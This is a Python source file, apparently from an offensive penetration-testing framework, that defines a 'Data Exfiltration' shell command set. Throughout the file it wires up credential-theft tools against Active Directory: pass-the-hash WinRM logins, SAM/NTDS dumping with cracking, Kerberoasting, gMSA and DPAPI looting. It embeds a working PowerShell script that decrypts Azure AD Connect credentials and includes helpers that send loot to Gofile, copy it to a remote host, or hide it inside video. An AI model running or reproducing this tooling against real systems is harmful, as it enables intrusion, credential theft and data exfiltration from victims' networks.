"""Data Exfiltration command set.

Pending phase module covering data-out operations: XOR file
encrypt/decrypt, Evil-WinRM authentication, Active Directory dumpers
(secretsdump, GetUserSPNs, GetADUsers, gMSADumper, dploot, samdump2,
reg.py, getnthash.py, adgetpass), Git tree dumping, rsync deployment,
infinitestorage video evidence, Gofile uploads, in-zip extraction, and
the C2 implant download helpers.

Pending status: this set inherits from
:class:`cli.commands._dormancy.PendingCommandSet`, so it is discovered for
test coverage but not registered onto the shell while ``LazyOwnShell``
still defines the original methods. Promote it to
:class:`cli.commands._base.LazyOwnCommandSet` once the legacy copies are
deleted from ``lazyown.py``.
"""

from __future__ import annotations

import os
import shlex
import subprocess

import cmd2
import requests

from cli.commands._dormancy import PendingCommandSet
from utils import (
    GREEN,
    exfiltration_category,
    get_credentials,
    get_domain,
    get_hash,
    get_users_dic,
    is_binary_present,
    is_package_installed,
    print_error,
    print_msg,
    print_warn,
    xor_encrypt_decrypt,
)

SESSIONS_DIRECTORY_NAME = "sessions"
CREDENTIALS_FILENAME = "credentials.txt"
USERS_FILENAME = "users.txt"
HASH_FILENAME = "hash.txt"
ENCRYPTED_FILE_SUFFIX = ".enc"
DEFAULT_ADMIN_USER = "Administrator"

IMPACKET_INSTALL_COMMAND = "sudo apt install impacket -y"
SAMDUMP2_INSTALL_COMMAND = "apt-get install samdump2 -y"
GIT_DUMPER_INSTALL_COMMAND = "pip3 install git-dumper"
GOFILE_UPLOAD_URL = "https://store1.gofile.io/contents/uploadfile"
GOFILE_OK_STATUS = "ok"
PKINIT_REPOSITORY_URL = "https://github.com/dirkjanm/PKINITtools.git"
PKINIT_RELATIVE_PATH = os.path.join("external", ".exploit", "PKINITtools")
PKINIT_DEPS_INSTALL_COMMAND = "pip3 install impacket minikerberos"
GMSADUMPER_REPOSITORY_URL = "https://github.com/micahvandeusen/gMSADumper.git"
GMSADUMPER_RELATIVE_PATH = os.path.join("external", ".exploit", "gMSADumper")
DPLOOT_REPOSITORY_URL = "https://github.com/zblurx/dploot.git"
DPLOOT_RELATIVE_PATH = os.path.join("external", ".exploit", "dploot")
INFINITE_STORAGE_SCRIPT = "modules_ext/lazyown_infinitestorage/lazyown_infinitestorage.py"
ENCODED_OUTPUT_FILENAME = "encoded_output.avi"
DECODED_OUTPUT_DIRECTORY = "sessions/decoded_output"
DEFAULT_VIDEO_WIDTH = "1920"
DEFAULT_VIDEO_HEIGHT = "1080"
DEFAULT_VIDEO_FPS = "25"
ENCRYPT_ARG_COUNT = 2
EVIDENCE_VIDEO_EXTENSIONS = (".mp4", ".mkv", ".avi")
EVIDENCE_EXCLUDED_EXTENSIONS = (".grisun0",)
EVIDENCE_ZIP_FILENAME = "sessions.zip"
DEFAULT_REG_USERNAME = "henry.vinson"
DEFAULT_REG_KEY_NAME = "HKU\\\\Software"
DEFAULT_ADSYNC_DATABASE = "ADSync"
DEFAULT_ADSYNC_KEY_ID = "1"
DEFAULT_ADSYNC_DLL_PATH = "C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll"
DEFAULT_ADSYNC_CONFIG_LOGIN_DOMAIN = "forest-login-domain"
DEFAULT_ADSYNC_CONFIG_LOGIN_USER = "forest-login-user"
ADCONNECT_SCRIPT_RELATIVE_PATH = "sessions/adconnect.ps1"
DPLOOT_DEFAULT_BLOB = "DFBE70A7E5CC19A398EBF1B96859CE5D"
DPLOOT_DEFAULT_ACTION = "blob"
DPLOOT_ACTION_PROMPT = (
    "    [!] Enter the action "
    "(backupkey,blob,browser,certificates,credentials,machinecertificates,"
    "machinecredentials,machinemasterkeys,machinetriage,machinevaults,"
    "masterkeys,mobaxterm,rdg,sccm,triage,vaults,wam,wifi) "
    f"default: {DPLOOT_DEFAULT_ACTION}"
)
DPLOOT_NO_ARG_ACTIONS = (
    "machinemasterkeys",
    "machinecredentials",
    "machinevaults",
    "machinecertificates",
    "wifi",
    "sccm",
)
DPLOOT_MKFILE_ACTIONS = ("certificates", "credentials", "vaults", "rdg")
DPLOOT_PVK_KEY_ACTIONS = ("mobaxterm", "wam")
RSYNC_REMOTE_DROP_PATH = "/home/.grisun0"
ADSYNC_POWERSHELL_TEMPLATE = """Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server={server};Database={database};Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path '{dll_path}'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet([GUID]"{entropy}", [GUID]"{instance_id}", {key_id})
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = (select-xml -Content $config -XPath "//parameter[@name='{config1}']").Node.InnerText
$username = (select-xml -Content $config -XPath "//parameter[@name='{config2}']").Node.InnerText
$password = (select-xml -Content $decrypted -XPath "//attribute").Node.InnerText

Write-Host ("Domain: " + $domain)
Write-Host ("Username: " + $username)
Write-Host ("Password: " + $password)
"""


def _sessions_path(base_path: str) -> str:
    """Return the absolute ``sessions/`` directory under ``base_path``."""
    return os.path.join(base_path, SESSIONS_DIRECTORY_NAME)


def _read_first_credential(credentials_file: str) -> tuple[str, str] | None:
    """Return the first ``username:password`` pair from ``credentials_file``.

    Args:
        credentials_file: Path to a colon-separated ``credentials.txt``.

    Returns:
        A tuple ``(username, password)`` or ``None`` when the file is
        empty or malformed.
    """
    if not os.path.exists(credentials_file):
        return None
    with open(credentials_file, "r", encoding="utf-8") as handle:
        text = handle.read().strip()
    if not text:
        return None
    first_line = text.splitlines()[0]
    if ":" not in first_line:
        return None
    username, password = first_line.split(":", 1)
    return username, password


class ExfiltrationCommandSet(PendingCommandSet):
    """Pending phase module for the Data Exfiltration commands."""

    phase = "exfil"
    category = exfiltration_category

    @cmd2.with_category(exfiltration_category)
    def do_encrypt(self, line):
        """Encrypt a file with XOR using a caller-supplied key.

        Args:
            line: Whitespace-separated ``<file_path> <key>``. Anything
                else triggers a usage error.

        Returns:
            None.
        """
        arguments = shlex.split(line)
        if len(arguments) != ENCRYPT_ARG_COUNT:
            print_error("Usage: encrypt <file_path> <key>")
            return
        file_path, key = arguments
        try:
            with open(file_path, "rb") as handle:
                data = handle.read()
            encrypted = xor_encrypt_decrypt(data, key)
            output_path = file_path + ENCRYPTED_FILE_SUFFIX
            with open(output_path, "wb") as handle:
                handle.write(encrypted)
            print_msg(f"File encrypted: {output_path}")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    @cmd2.with_category(exfiltration_category)
    def do_decrypt(self, line):
        """Decrypt an XOR-encrypted file using the matching key.

        Args:
            line: Whitespace-separated ``<file_path> <key>``. Anything
                else triggers a usage error. The ``.enc`` suffix is
                stripped from the output filename when present.

        Returns:
            None.
        """
        arguments = shlex.split(line)
        if len(arguments) != ENCRYPT_ARG_COUNT:
            print_error("Usage: decrypt <file_path> <key>")
            return
        file_path, key = arguments
        try:
            with open(file_path, "rb") as handle:
                data = handle.read()
            decrypted = xor_encrypt_decrypt(data, key)
            output_path = file_path.replace(ENCRYPTED_FILE_SUFFIX, "")
            with open(output_path, "wb") as handle:
                handle.write(decrypted)
            print_msg(f"File decrypted: {output_path}")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    @cmd2.with_category(exfiltration_category)
    def do_evilwinrm(self, line):
        """Drive Evil-WinRM through password, hash or kerberos-only auth.

        Modes:
            ``pass`` reuses entries from ``sessions/credentials*.txt``.
            ``hash`` reads ``sessions/hash.txt`` for an NT hash and
            prompts for a username (default ``Administrator``).
            ``nopass`` connects to ``<subdomain>.<domain>`` without
            credentials.

        Args:
            line: Sub-command starting with ``pass``, ``hash`` or
                ``nopass``, optionally followed by counter / PowerShell
                flags for ``pass``.

        Returns:
            None.
        """
        from utils import check_rhost

        rhost = self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        hash_txt = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, HASH_FILENAME)
        if not check_rhost(rhost):
            return
        if line.startswith("pass"):
            tokens = line.split(" ")
            ps1 = ""
            if len(tokens) == 2:
                ncredent = tokens[1]
                credentials = get_credentials(ncred=int(ncredent)) if ncredent else get_credentials()
            elif len(tokens) == 3:
                ncredent = tokens[1]
                powershell = tokens[2]
                credentials = get_credentials(ncred=int(ncredent))
                ps1 = "-s . " if powershell == "y" else ""
            else:
                credentials = get_credentials()
                ask = input("    [?] Do you pass a powershell ? (y/n): ") or "n"
                ps1 = "-s . " if ask == "y" else ""
            if not credentials:
                print_error(f"error {credentials}")
                return
            for user, password in credentials:
                command = f"cd {SESSIONS_DIRECTORY_NAME} && evil-winrm -i {rhost} -u {user} -p '{password}' {ps1}"
                print_msg(command)
                self.cmd(command)
            return
        if line.startswith("hash"):
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            user = input(f"    [!] Enter Username (default: {DEFAULT_ADMIN_USER})") or DEFAULT_ADMIN_USER
            command = f"evil-winrm -i {rhost} -u {user} -H '{hash_value}'"
            print_msg(command)
            self.cmd(command)
            return
        if line.startswith("nopass"):
            command = f"evil-winrm -i {subdomain}.{domain} -r {domain}"
            print_msg(command)
            self.cmd(command)
            return
        print_error(
            "Invalid usage. Use 'pass' to authenticate, 'hash' to use hashes, or 'nopass' to skip the password."
        )

    @cmd2.with_category(exfiltration_category)
    def do_secretsdump(self, line):
        """Run impacket-secretsdump for SAM, credentials, or NTDS payloads.

        Sub-commands:
            ``sam``     parses local ``sessions/SAM`` + ``sessions/SYSTEM``
            ``creds``   iterates ``sessions/credentials.txt`` pairs
            ``system``  parses live ``ntds.dit`` + registry hives

        Args:
            line: Sub-command from the list above. Empty input prints
                the usage error.

        Returns:
            None.
        """
        if not is_binary_present("secretsdump.py"):
            print_warn("secretsdump.py is not installed. Installing dependencies.")
            self.cmd(IMPACKET_INSTALL_COMMAND)
        print_msg("Gathering credentials for secretsdump.py execution...")
        url = self.params["url"]
        rhost = self.params["rhost"]
        wordlist = self.params["wordlist"]
        dominio = get_domain(url)
        credentials_path = os.path.join(SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
        if not line:
            print_error("use options line like: secretsdump sam | creds | system")
            return
        if line.startswith("sam"):
            system_path = os.path.join(SESSIONS_DIRECTORY_NAME, "SYSTEM")
            if not os.path.exists(system_path):
                print_error("You need credentials.txt or SAM and SYSTEM files")
                return
            hashs = os.path.join(SESSIONS_DIRECTORY_NAME, "hashs.txt")
            command = (
                f"secretsdump.py -system {SESSIONS_DIRECTORY_NAME}/SYSTEM "
                f"-sam {SESSIONS_DIRECTORY_NAME}/SAM LOCAL -outputfile {hashs}"
            )
            print_msg(f"Executing command: {command}")
            self.cmd(command)
            self.cmd(f"nano {hashs}.sam")
            self.cmd(f"cat {hashs}.sam")
            command = f"sudo john --fork=4 --format=nt {hashs}.sam --wordlist={wordlist}"
            print_msg(command)
            self.cmd(command)
            self.cmd(f"sudo john {hashs}.sam --show")
            return
        if line.startswith("creds"):
            with open(credentials_path, "r", encoding="utf-8") as handle:
                for file_line in handle:
                    parts = file_line.split(":")
                    username = parts[0]
                    password = parts[1].replace("\n", "")
                    domain = input(f"    [!] Domain: (default: {dominio})").strip() or dominio
                    ip_address = input(f"    [!] IP Address: (default: {rhost})").strip() or rhost
                    command = f"secretsdump.py {domain}/{username}:{password}@{ip_address}"
                    print_msg(f"Executing command: {command}")
                    self.cmd(command)
                    return
        if line.startswith("system"):
            command = (
                f"cd {SESSIONS_DIRECTORY_NAME} && secretsdump.py local "
                "-system registry/SYSTEM -security registry/SECURITY "
                "-ntds Active\\ Directory/ntds.dit -outputfile hashes"
            )
            print_msg(command)
            self.cmd(command)
            command = f"cd {SESSIONS_DIRECTORY_NAME} && cut -d ':' -f 4 hashes.ntds > hashes.txt"
            print_msg(command)
            self.cmd(command)
            command = f"cd {SESSIONS_DIRECTORY_NAME} && awk -F ':' '{{print $3 \":\" $4}}' hashes.ntds > hashes2.txt"
            print_msg(command)
            self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_getuserspns(self, line):
        """Run impacket-GetUserSPNs to request roastable service tickets.

        Args:
            line: Optional username to use in place of the first entry
                from ``sessions/credentials.txt``.

        Returns:
            None.
        """
        if not is_binary_present("GetUserSPNs.py"):
            print_warn("GetUserSPNs.py is not installed. Installing dependencies.")
            self.cmd(IMPACKET_INSTALL_COMMAND)
        print_msg("Gathering credentials for GetUserSPNs.py execution...")
        url = self.params["url"]
        rhost = self.params["rhost"]
        dominio = get_domain(url)
        domain = input(f"    [!] Domain: (default: {dominio}) ").strip() or dominio
        credentials_path = os.path.join(SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
        if not os.path.exists(credentials_path):
            username = input("    [!] Username: ").strip()
            password = input("    [!] Password: ").strip()
        else:
            with open(credentials_path, "r", encoding="utf-8") as handle:
                for file_line in handle:
                    parts = file_line.split(":")
                    username = line if line else parts[0]
                    password = parts[1].replace("\n", "")
        ip_address = input(f"    [!] IP Address: (default: {rhost}) ").strip() or rhost
        command = f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {ip_address} -request"
        print_msg(f"Executing command: {command}")
        self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_gitdumper(self, line):
        """Install ``git-dumper`` if missing and pull a remote ``.git`` tree.

        Args:
            line: Unused; an interactive prompt collects the repo URL.

        Returns:
            None.
        """
        del line
        url = self.params["url"]
        if not is_package_installed("git-dumper"):
            print_warn("git-dumper not found. Installing...")
            self.cmd(GIT_DUMPER_INSTALL_COMMAND)
        repo_url = input(f"Enter the Git repository URL (e.g., default: {url}").strip() or url
        if not repo_url:
            print_error("Repository URL is required.")
            return
        domain = get_domain(repo_url)
        output_dir = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, domain)
        command = f"git-dumper {repo_url} {output_dir}"
        print_msg(f"Executing command: {command}")
        self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_evidence(self, line=""):
        """Encode the ``sessions/`` tree into a video file or decode one back.

        Default invocation compresses ``sessions/`` to
        ``sessions.zip`` and renders ``sessions/encoded_output.avi`` via
        the infinitestorage helper. Pass ``decode`` to pick a video and
        recover its original payload.

        Args:
            line: ``decode`` to enter decode mode; anything else encodes.

        Returns:
            None.
        """
        sessions_dir = SESSIONS_DIRECTORY_NAME
        zip_file_path = EVIDENCE_ZIP_FILENAME
        if line and line.startswith("decode"):
            video_files = [f for f in os.listdir(sessions_dir) if f.endswith(EVIDENCE_VIDEO_EXTENSIONS)]
            if not video_files:
                print_error("No videos in the 'sessions' folder.")
                return
            print_msg("Videos available for decoding:")
            for idx, video in enumerate(video_files, start=1):
                print_msg(f"{idx}: {video}")
            choice = input("Choose the video number to decode: ")
            try:
                choice = int(choice)
            except ValueError:
                print_error("Please enter a valid number.")
                return
            if not 1 <= choice <= len(video_files):
                print_error("Invalid selection.")
                return
            video_file = video_files[choice - 1]
            video_full_path = os.path.join(self.path, sessions_dir, video_file)
            if not os.path.isfile(video_full_path):
                print_error(f"Error: {video_full_path} does not exist.")
                return
            command = [
                "python3",
                INFINITE_STORAGE_SCRIPT,
                "--mode",
                "decode",
                "--input",
                video_full_path,
                "--output",
                DECODED_OUTPUT_DIRECTORY,
                "--frame_size",
                DEFAULT_VIDEO_WIDTH,
                DEFAULT_VIDEO_HEIGHT,
                "--fps",
                DEFAULT_VIDEO_FPS,
            ]
            print_msg(f"Decoding {video_file}...")
        else:
            self.cmd(f"zip -r {zip_file_path} {sessions_dir}")
            print_msg(f"Folder {sessions_dir} compressed to {zip_file_path}.")
            command = [
                "python3",
                INFINITE_STORAGE_SCRIPT,
                "--mode",
                "encode",
                "--input",
                zip_file_path,
                "--output",
                f"{SESSIONS_DIRECTORY_NAME}/{ENCODED_OUTPUT_FILENAME}",
                "--frame_size",
                DEFAULT_VIDEO_WIDTH,
                DEFAULT_VIDEO_HEIGHT,
                "--fps",
                DEFAULT_VIDEO_FPS,
            ]
            print_msg("Encoding to video...")
        try:
            subprocess.run(command, check=True)
            print_msg("Command executed successfully: " + " ".join(command))
        except subprocess.CalledProcessError as error:
            print_error(f"Error running the command: {error}")

    @cmd2.with_category(exfiltration_category)
    def do_getadusers(self, line):
        """Run impacket-GetADUsers to enumerate AD accounts on the DC.

        When ``sessions/credentials.txt`` is present the helper iterates
        each pair authenticated to ``rhost``. Otherwise it offers the
        list of ``.txt`` files under ``sessions/`` so the operator can
        select a username list and brute-force kerberos pre-auth.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        sessions_dir = SESSIONS_DIRECTORY_NAME
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        credentials_path = os.path.join(sessions_dir, CREDENTIALS_FILENAME)
        if os.path.exists(credentials_path):
            credentials = get_credentials()
            if not credentials:
                return
            for user, password in credentials:
                from utils import copy2clip

                try:
                    copy2clip(password)
                    command = f"GetADUsers.py {domain}/{user} -dc-ip {rhost} -debug"
                    print_msg(command)
                    self.cmd(command)
                except Exception as error:
                    print_error(f"Failed to execute GetADUsers: {error}")
            return
        txt_files = [f for f in os.listdir(sessions_dir) if f.endswith(".txt")]
        if not txt_files:
            print_error("No .txt files found in the 'sessions' directory.")
            return
        print_msg("Available .txt files:")
        for idx, name in enumerate(txt_files):
            print_msg(f"{idx}: {name}")
        try:
            file_index = int(input(f"    {GREEN}[!] Select the file number to use: "))
            selected_file = txt_files[file_index]
        except (IndexError, ValueError):
            print_error("Invalid selection.")
            return
        selected_file_path = os.path.join(sessions_dir, selected_file)
        try:
            with open(selected_file_path, "r", encoding="utf-8") as handle:
                for entry in handle:
                    username = entry.strip()
                    if not username:
                        continue
                    command = f"GetADUsers.py {domain}/{username} -no-pass -dc-ip {rhost} -debug -k 2>/dev/null"
                    print_msg(f"Executing: {command}")
                    self.cmd(command)
        except Exception as error:
            print_error(f"Failed to execute GetADUsers for users in {selected_file_path}: {error}")

    @cmd2.with_category(exfiltration_category)
    def do_adgetpass(self, line):
        """Generate a PowerShell script to extract Azure AD Connect credentials.

        Renders the standard ``mcrypt.dll`` key-manager script with
        operator-provided GUIDs and SQL identifiers, writing it to
        ``sessions/adconnect.ps1`` for upload to the target.

        Args:
            line: Space-separated ``server database keyset_id instance_id entropy``.
                Each missing positional triggers an interactive prompt.

        Returns:
            None.
        """
        arguments = line.split() if line else []
        subdomain = self.params["subdomain"]
        server = (
            arguments[0]
            if len(arguments) > 0
            else (input(f"    [!] Enter the SQL Server (default '{subdomain}'): ").strip() or subdomain)
        )
        database = (
            arguments[1]
            if len(arguments) > 1
            else (
                input(f"    [!] Enter the Database Name (default '{DEFAULT_ADSYNC_DATABASE}'): ").strip()
                or DEFAULT_ADSYNC_DATABASE
            )
        )
        key_id = (
            arguments[2]
            if len(arguments) > 2
            else (
                input(f"    [!] Enter Keyset ID (default '{DEFAULT_ADSYNC_KEY_ID}'): ").strip() or DEFAULT_ADSYNC_KEY_ID
            )
        )
        instance_id = arguments[3] if len(arguments) > 3 else input("    [!] Enter Instance ID (GUID): ").strip()
        entropy = arguments[4] if len(arguments) > 4 else input("    [!] Enter Entropy (GUID): ").strip()
        dll_path = (
            input(f"    [!] Enter the path to 'mcrypt.dll' (default '{DEFAULT_ADSYNC_DLL_PATH}'): ").strip()
            or DEFAULT_ADSYNC_DLL_PATH
        )
        config1 = (
            input(f"    [!] enter parameter no 1 (default: {DEFAULT_ADSYNC_CONFIG_LOGIN_DOMAIN})")
            or DEFAULT_ADSYNC_CONFIG_LOGIN_DOMAIN
        )
        config2 = (
            input(f"    [!] enter parameter no 2 (default: {DEFAULT_ADSYNC_CONFIG_LOGIN_USER})")
            or DEFAULT_ADSYNC_CONFIG_LOGIN_USER
        )
        rendered = (
            ADSYNC_POWERSHELL_TEMPLATE.replace("{server}", server)
            .replace("{database}", database)
            .replace("{dll_path}", dll_path)
            .replace("{entropy}", entropy)
            .replace("{instance_id}", instance_id)
            .replace("{key_id}", key_id)
            .replace("{config1}", config1)
            .replace("{config2}", config2)
        )
        with open(ADCONNECT_SCRIPT_RELATIVE_PATH, "w", encoding="utf-8") as handle:
            handle.write(rendered)
        print_msg(f"PowerShell script '{ADCONNECT_SCRIPT_RELATIVE_PATH}' has been created.")

    @cmd2.with_category(exfiltration_category)
    def do_samdump2(self, line):
        """Run samdump2 against ``sessions/SYSTEM`` and ``sessions/SAM``.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        rhost = self.params["rhost"]
        if not is_binary_present("samdump2"):
            print_warn("samdump2 is not installed. Installing dependencies.")
            self.cmd(SAMDUMP2_INSTALL_COMMAND)
        if not os.path.exists(os.path.join(SESSIONS_DIRECTORY_NAME, "SYSTEM")):
            print_error("You need credentials.txt or SAM and SYSTEM files")
            return
        output_file = os.path.join(SESSIONS_DIRECTORY_NAME, f"samdump_{rhost}.txt")
        command = f"samdump2 {SESSIONS_DIRECTORY_NAME}/SYSTEM {SESSIONS_DIRECTORY_NAME}/SAM -o {output_file}"
        print_msg(f"Executing command: {command}")
        self.cmd(command)
        self.cmd(f"cat {output_file}")
        self.logcsv(f"samdump2 {command}")

    @cmd2.with_category(exfiltration_category)
    def do_reg_py(self, line):
        """Query a remote registry hive with impacket-reg.py over hash auth.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        subdomain = self.params["subdomain"]
        domain = self.params["domain"]
        if not is_binary_present("reg.py"):
            print_warn("reg.py is not installed. Installing.")
            self.cmd(IMPACKET_INSTALL_COMMAND)
            return
        hash_value = get_hash()
        domain = input(f"Enter domain (e.g., {domain}): ") or domain
        subdomain = input(f"Enter dc domain (e.g., {subdomain}): ") or subdomain
        username = input(f"Enter username (e.g., {DEFAULT_REG_USERNAME}): ") or DEFAULT_REG_USERNAME
        key_name = input(f"Enter registry key (e.g., {DEFAULT_REG_KEY_NAME}): ") or DEFAULT_REG_KEY_NAME
        for binary in ("reg.py", "impacket-reg"):
            command = f"{binary} -hashes {hash_value} {domain}/{username}@{subdomain} query -keyName {key_name}"
            print_msg(f"Executing command: {command}")
            self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_unzip(self, line):
        """Extract a zip archive located under ``sessions/``.

        Args:
            line: Optional zip filename. Empty input picks the first
                ``*.zip`` discovered via :func:`get_users_dic`.

        Returns:
            None.
        """
        zips = line.strip() if line else get_users_dic("zip")
        if not zips:
            print_error("No zip files found at sessions directory")
            return
        if not os.path.exists(zips):
            print_error("No zip files found at sessions path directory")
            return
        command = f"cd {SESSIONS_DIRECTORY_NAME} && unzip {zips}"
        print_msg(f"Try {command}")
        self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_getnthash_py(self, line):
        """Recover the NT hash from a Kerberos U2U TGS via PKINITtools.

        Args:
            line: Unused; the helper iterates ``sessions/credentials.txt``.

        Returns:
            None.
        """
        del line
        pkinit_path = os.path.join(self.path, PKINIT_RELATIVE_PATH)
        if not os.path.exists(pkinit_path):
            self.cmd(f"git clone {PKINIT_REPOSITORY_URL} {pkinit_path}")
            self.cmd(PKINIT_DEPS_INSTALL_COMMAND)
        domain = self.params["domain"]
        credentials_path = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return
        credentials = get_credentials()
        if not credentials:
            return
        for user, password in credentials:
            command = (
                f"cd {SESSIONS_DIRECTORY_NAME} && "
                f"export KRB5CCNAME={user}.cache && "
                f"python3 {pkinit_path}/getnthash.py {domain}/{user} -key {password}"
            )
            print_msg(command)
            self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_upload_gofile(self, line):
        """Upload a file from ``sessions/`` to Gofile via its HTTP API.

        The helper enumerates non-excluded files under ``sessions/``, asks
        the operator to pick one, posts it to ``store1.gofile.io``, and
        prints the resulting metadata.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        file_list: list[str] = []
        for root, _dirs, files in os.walk(SESSIONS_DIRECTORY_NAME):
            for name in files:
                if any(name.endswith(ext) for ext in EVIDENCE_EXCLUDED_EXTENSIONS):
                    continue
                file_list.append(os.path.join(root, name))
        if not file_list:
            print_error("No files found in the sessions directory.")
            return
        print_msg("Select a file to Upload:")
        for idx, name in enumerate(file_list, 1):
            print_msg(f"  {idx}) {name}")
        choice_text = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()
        try:
            choice = int(choice_text)
        except ValueError:
            print_error("Invalid input. Please enter a number.")
            return
        if not 1 <= choice <= len(file_list):
            print_warn("Invalid choice.")
            return
        file_path = file_list[choice - 1]
        if not os.path.isfile(file_path):
            print_error(f"File '{file_path}' does not exist.")
            return
        try:
            with open(file_path, "rb") as handle:
                files_payload = {"file": handle}
                response = requests.post(GOFILE_UPLOAD_URL, files=files_payload)
            response.raise_for_status()
            data = response.json()
            if data.get("status") != GOFILE_OK_STATUS:
                print_error("Upload failed. Please check the response.")
                return
            info = data["data"]
            print_msg("File uploaded successfully!")
            print_msg(f"File ID: {info['id']}")
            print_msg(f"File Name: {info['name']}")
            print_msg(f"File Size: {info['size']} bytes")
            print_msg(f"File Type: {info['mimetype']}")
            print_warn(f"Download Page: {info['downloadPage']}")
            print_msg(f"MD5 Hash: {info['md5']}")
            print_msg(f"Created Time: {info['createTime']}")
            print_msg(f"Modified Time: {info['modTime']}")
        except requests.exceptions.RequestException as error:
            print_error(f"An error occurred: {error}")

    @cmd2.with_category(exfiltration_category)
    def do_rsync(self, line):
        """Push the ``sessions/`` tree to ``rhost`` over SCP with sshpass.

        Args:
            line: Optional alternate source path; defaults to
                ``<self.path>/sessions``.

        Returns:
            None.
        """
        if line:
            tmp_path = line.strip()
        else:
            tmp_path = _sessions_path(self.path)
        credentials_path = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
        if not os.path.exists(credentials_path):
            username = self.params.get("username") or input("    [!] Enter the username: ")
            password = self.params.get("password") or input("    [!] Enter the password: ")
        else:
            selected = get_users_dic("txt")
            credential = _read_first_credential(selected) if selected else None
            if credential is None:
                username = self.params.get("username") or input("    [!] Enter the username: ")
                password = self.params.get("password") or input("    [!] Enter the password: ")
            else:
                username, password = credential
        rhost = self.params["rhost"]
        print_msg("Deploying sessions directory.")
        rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:{RSYNC_REMOTE_DROP_PATH}"
        print_msg(rsync_command)
        self.cmd(rsync_command)

    @cmd2.with_category(exfiltration_category)
    def do_gmsadumper(self, line):
        """Run gMSADumper to read gMSA password blobs visible to the user.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        gmsadumper_path = os.path.join(self.path, GMSADUMPER_RELATIVE_PATH)
        try:
            if not os.path.exists(gmsadumper_path):
                print_msg("gMSADumper is not installed. Installing...")
                self.cmd(f"git clone {GMSADUMPER_REPOSITORY_URL} {gmsadumper_path}")
            domain = self.params.get("domain")
            subdomain = self.params.get("subdomain")
            ldap_server = f"{subdomain}.{domain}"
            credentials_path = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
            if not os.path.exists(credentials_path):
                command = f"cd {gmsadumper_path} && python3 gMSADumper.py -k -d {domain} -l {ldap_server}"
            else:
                selected = get_users_dic("txt")
                credential = _read_first_credential(selected) if selected else None
                if credential is None:
                    username = self.params.get("username") or input("    [!] Enter the username: ")
                    password = self.params.get("password") or input("    [!] Enter the password: ")
                else:
                    username, password = credential
                if not domain:
                    print_error("Domain not defined.")
                    domain = input("    [!] Enter the domain: ")
                base = f"cd {gmsadumper_path} && python3 gMSADumper.py -u {username} -p {password} -d {domain}"
                command = f"{base} -l {ldap_server}" if ldap_server else base
            self.cmd(command)
        except Exception as error:
            print_error(f"Error: {error}")

    @cmd2.with_category(exfiltration_category)
    def do_dploot(self, line):
        """Run dploot to loot DPAPI-protected secrets.

        Actions: ``backupkey``, ``blob``, ``browser``, ``certificates``,
        ``credentials``, ``machinecertificates``, ``machinecredentials``,
        ``machinemasterkeys``, ``machinevaults``, ``masterkeys``,
        ``mobaxterm``, ``rdg``, ``sccm``, ``vaults``, ``wam``, ``wifi``.

        Args:
            line: First token is the action; missing input prompts for it.

        Returns:
            None.
        """
        dploot_path = os.path.join(self.path, DPLOOT_RELATIVE_PATH)
        try:
            if not os.path.exists(dploot_path):
                print_msg("dploot is not installed. Installing...")
                self.cmd(f"git clone {DPLOOT_REPOSITORY_URL} {dploot_path}")
                self.cmd(f"cd {dploot_path} && pipx install .")
            action = line.split()[0] if line else (input(DPLOOT_ACTION_PROMPT) or DPLOOT_DEFAULT_ACTION)
            rhost = self.params.get("rhost")
            domain = self.params.get("domain")
            credentials_path = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
            if not os.path.exists(credentials_path):
                username = self.params.get("username") or input("    [!] Enter the username: ")
                password = self.params.get("password") or input("    [!] Enter the password: ")
            else:
                selected = get_users_dic("txt")
                credential = _read_first_credential(selected) if selected else None
                if credential is None:
                    username = self.params.get("username") or input("    [!] Enter the username: ")
                    password = self.params.get("password") or input("    [!] Enter the password: ")
                else:
                    username, password = credential
                if not domain:
                    print_error("Domain not defined.")
                    domain = input("    [!] Enter the domain: ")
